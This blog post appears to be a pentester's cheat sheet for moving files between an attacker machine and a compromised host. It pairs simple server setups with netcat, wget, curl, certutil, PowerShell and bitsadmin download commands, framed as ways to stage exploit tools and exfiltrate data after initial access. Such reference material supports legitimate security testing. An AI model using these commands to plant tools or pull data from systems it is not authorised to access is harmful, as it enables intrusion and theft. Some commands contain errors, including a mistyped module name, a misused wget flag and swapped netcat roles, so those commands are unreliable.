---
title: File Transfer Techniques
layout: post
date: 2022-06-28 
tags: [pentesting, Appsec]	
---

I had a lot of trouble transferring files from the Host to the Attacker and from the Attacker to the Host. I have a hard time remembering commands and techniques that I have previously learnt. As a result, I'm keeping a mental note of this for future reference. Although we can simply download files from a web server using a browser, what about command line???  

File transfers are inconvenient, and in most circumstances, after getting initial access to the target system, we may use them to upload tools and vulnerabilities to try to raise privileges, exfiltrate sensitive data from the target back to your machine, or just move files between the target and you.

### Setting up the server's (Linux) :

#### Apache
Copy files into **/var/www/html** folder,Then start apache server  
```yaml
service apache2 start
``` 

#### Simple Http Server(Using Python & Python3)
It uses port 8000 bydefault,if you want to change,you can specify according to yours.  
```yaml
python -m SimpleHTTPServer 1337
python3 -m hhtp.server 1337
``` 

#### Updog
Updog is a replacement for Python's SimpleHTTPServer. It allows uploading and downloading via HTTP/S, can set ad hoc SSL certificates and use HTTP basic auth.
```yaml
pip3 install updog
updog -d anything -p 1337 --ssl
```

#### PyFTPD(FTPD Using Python Library)
PyFTPD is a FTP server based on pyftpdlib  
It doesn’t come installed by default, but you can install it with apt : **apt-get install python-pyftpdlib**  
```yaml
python -m pyftpdlib -p 21
```  

#### PHP 
PHP web server runs only one single-threaded process.  
```yaml
php -S localhost:1337
```  

#### TFTP
Trivial File Transfer Protocol (TFTP) is a simple lockstep File Transfer Protocol which allows a client to get a file from or put a file onto a remote host.  
```yaml
service atftpd start
```  

### File Transfer (Linux) :  

#### Netcat
Netcat is like a swiss army knife for geeks. It can be used for just about anything involving TCP or UDP. One of its most practical uses is to transfer files  
```yaml
Sender : nc -nv localhost 1337  > file
Receiver : nc -lvnp 1337  < file
```  

#### Wget
Wget is a free network utility to retrieve files from the World Wide Web using HTTP and FTP  
```yaml
wget http://localhost:1337/file  -o outputfile
wget --user=NAME --password='PASSWORD' ftp://localhost/file -o outputfile
wget --user=NAME --password='PASSWORD'  http://ip:port/file  -o outputfile
```  

#### Curl 
```yaml
curl http://localhost:1337  --output file
curl --user username:password ftp://localhost/directory/file -o file 
```  

#### SCP
```yaml
Copy a file from local to remote system : scp filename remote_username@ip:/remote/directory
Copy a file from remote to local system : scp remote_username@ip:/remote/file /local/directory
```  

#### RSync
rsync is a free software computer program for Unix and Linux like systems which synchronizes files and directories from one location to another while minimizing data transfer using delta encoding when appropriate  
```yaml
Local to Remote System : rsync -v -e ssh filetoshare username@ip
Remote to Local System : rsync -v -e ssh username@ip:~/file localpath
```  

### File Transfer (Windows) :  

#### CertUtil
Windows has a built-in program called CertUtil, which can  be used to manage certificates in Windows. Using this program you can install, backup, delete, manage, and perform various functions related to certificates and certificate stores in Windows.  
One of the features of CertUtil is the ability to download a certificate, or any other file for that matter, from a remote URL and save it as a local file
```yaml
certutil -urlcache -split -f "http://localhost:1337/file" output-file
```  

#### PowerShell
Powershell is an advanced version of the standard cmd.exe with scripting capabilities. You can use a Powershell one-liner to download a file from a HTTP server
```yaml
powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file','output-file')
```  

#### BITS  
The Background Intelligent Transfer Service, BITS for short and the built-in bitsadmin.exe command line utility can also be leveraged to download files over HTTP in the following way
```yaml
bitsadmin /transfer job /download /priority high http://ip:port/file localpath
```